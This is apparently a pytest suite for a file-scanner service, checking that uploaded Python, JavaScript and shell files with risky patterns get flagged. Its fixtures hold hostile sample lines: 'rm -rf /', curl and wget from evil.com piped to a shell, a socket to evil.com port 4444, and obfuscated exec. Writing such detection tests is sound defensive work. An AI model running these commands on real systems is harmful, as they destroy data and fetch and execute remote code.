import pytest
from io import BytesIO
import sys
sys.path.insert(0, 'backend')

from services.file_scanner import FileScanner, ScanResult
from utils.text_analyzer import TextAnalyzer


class TestFileScanner:
    """Test suite for file scanner service."""

    @pytest.fixture
    def scanner(self):
        return FileScanner()

    def test_clean_file_no_threats(self, scanner):
        """Clean Python file should pass."""
        content = b"def hello():\n    print('Hello, World!')\n"
        result = scanner.scan_file("clean.py", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_python_file_with_exec(self, scanner):
        """Python file with exec should be flagged."""
        content = b"import os\nexec('malicious code')\n"
        result = scanner.scan_file("suspicious.py", BytesIO(content))
        assert len(result.threats) >= 1
        assert any('exec' in t.lower() or 'suspicious' in t.lower() for t in result.threats)

    def test_python_file_with_eval(self, scanner):
        """Python file with eval should be flagged."""
        content = b"code = 'print(1)'\nresult = eval(code)\n"
        result = scanner.scan_file("dangerous.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_os_system(self, scanner):
        """File with os.system should be flagged."""
        content = b"import os\nos.system('rm -rf /')\n"
        result = scanner.scan_file("destructive.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_subprocess(self, scanner):
        """File with subprocess should be flagged."""
        content = b"import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"
        result = scanner.scan_file("subprocess_evil.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_base64_decode(self, scanner):
        """File with base64 decode pattern should be flagged."""
        content = b"import base64\npayload = base64.b64decode('SGVsbG8gV29ybGQ=')\n"
        result = scanner.scan_file("encoded.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_socket(self, scanner):
        """File with socket pattern should be flagged."""
        content = b"import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))\n"
        result = scanner.scan_file("backdoor.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_importlib(self, scanner):
        """File with importlib should be flagged."""
        content = b"import importlib\nimportlib.import_module('malware')\n"
        result = scanner.scan_file("dynamic_import.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_compile(self, scanner):
        """File with compile pattern should be flagged."""
        content = b"code = 'print(1)'\ncompiled = compile(code, '<string>', 'exec')\n"
        result = scanner.scan_file("compiled.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_python_file_with_pickle(self, scanner):
        """File with pickle should be flagged."""
        content = b"import pickle\ndata = pickle.loads(b'\\x80\\x03X\\x05\\x00\\x00\\x00dataq\\x00.')\n"
        result = scanner.scan_file("pickle_evil.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_javascript_file_with_eval(self, scanner):
        """JS file with eval should be flagged."""
        content = b"const code = 'console.log(1)';\neval(code);\n"
        result = scanner.scan_file("evil.js", BytesIO(content))
        assert len(result.threats) >= 1

    def test_javascript_file_with_function_constructor(self, scanner):
        """JS file with Function constructor should be flagged."""
        content = b"const fn = new Function('return 1');\n"
        result = scanner.scan_file("function_evil.js", BytesIO(content))
        assert len(result.threats) >= 1

    def test_javascript_file_with_fetch_redirect(self, scanner):
        """JS file with fetch to suspicious domain should be flagged."""
        content = b"fetch('http://evil.com/malware.js');\n"
        result = scanner.scan_file("fetch_evil.js", BytesIO(content))
        assert len(result.threats) >= 1

    def test_javascript_file_with_xmlhttprequest(self, scanner):
        """JS file with XMLHttpRequest should be flagged."""
        content = b"const xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://evil.com');\n"
        result = scanner.scan_file("xhr_evil.js", BytesIO(content))
        assert len(result.threats) >= 1

    def test_shell_script_with_rm_rf(self, scanner):
        """Shell script with rm -rf should be flagged."""
        content = b"#!/bin/bash\nrm -rf /\n"
        result = scanner.scan_file("destructive.sh", BytesIO(content))
        assert len(result.threats) >= 1

    def test_shell_script_with_curl_pipe(self, scanner):
        """Shell script with curl pipe should be flagged."""
        content = b"#!/bin/bash\ncurl http://evil.com/script.sh | bash\n"
        result = scanner.scan_file("download_run.sh", BytesIO(content))
        assert len(result.threats) >= 1

    def test_shell_script_with_wget_pipe(self, scanner):
        """Shell script with wget pipe should be flagged."""
        content = b"#!/bin/bash\nwget -qO- http://evil.com/script.sh | sh\n"
        result = scanner.scan_file("wget_run.sh", BytesIO(content))
        assert len(result.threats) >= 1

    def test_empty_file_is_safe(self, scanner):
        """Empty file should be safe."""
        content = b""
        result = scanner.scan_file("empty.txt", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_whitespace_only_file_is_safe(self, scanner):
        """Whitespace-only file should be safe."""
        content = b"   \n   \n   "
        result = scanner.scan_file("spaces.txt", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_text_file_is_safe(self, scanner):
        """Plain text file should be safe."""
        content = b"This is just a plain text file.\nNothing suspicious here.\n"
        result = scanner.scan_file("readme.txt", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_safe_python_file(self, scanner):
        """Safe Python utility file should pass."""
        content = b"def add(a, b):\n    return a + b\n\ndef multiply(a, b):\n    return a * b\n"
        result = scanner.scan_file("utils.py", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_safe_javascript_file(self, scanner):
        """Safe JS file should pass."""
        content = b"function greet(name) {\n    return `Hello, ${name}!`;\n}\n"
        result = scanner.scan_file("greeting.js", BytesIO(content))
        assert result.threats == []
        assert result.is_safe

    def test_multiple_threats_in_file(self, scanner):
        """File with multiple threat patterns should flag all."""
        content = b"import os\nimport subprocess\nexec('code')\nos.system('rm -rf /')\n"
        result = scanner.scan_file("multi_threat.py", BytesIO(content))
        assert len(result.threats) >= 3

    def test_obfuscated_threat_detection(self, scanner):
        """File with obfuscated exec pattern should be flagged."""
        content = b"getattr(__builtins__, 'exec')('import os')\n"
        result = scanner.scan_file("obfuscated.py", BytesIO(content))
        assert len(result.threats) >= 1

    def test_scan_result_serialization(self, scanner):
        """ScanResult should be serializable."""
        result = ScanResult(
            filename="test.py",
            is_safe=False,
            threats=["Threat 1", "Threat 2"]
        )
        serialized = result.model_dump()
        assert serialized['filename'] == "test.py"
        assert serialized['is_safe'] is False
        assert len(serialized['threats']) == 2
